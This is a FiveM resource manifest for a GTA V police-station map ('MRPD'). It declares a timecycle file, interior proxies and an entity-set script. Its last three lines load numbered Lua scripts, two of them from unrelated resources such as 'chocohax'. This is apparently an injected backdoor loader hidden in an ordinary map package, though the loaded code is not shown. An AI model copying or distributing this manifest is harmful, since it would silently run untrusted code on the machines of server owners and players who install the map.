fx_version 'bodacious'
game 'gta5'

author 'GABZ'
description 'MRPD'
version '1.0.0'

this_is_a_map 'yes'


data_file 'TIMECYCLEMOD_FILE' 'gabz_mrpd_timecycle.xml'
data_file 'INTERIOR_PROXY_ORDER_FILE' 'interiorproxies.meta'

files {
	'gabz_mrpd_timecycle.xml',
	'interiorproxies.meta'
}

client_script {
    "gabz_mrpd_entitysets.lua"
}
client_script "13277.lua"
client_script '@chocohax/10992.lua'
client_script '@anticheat/54639.lua'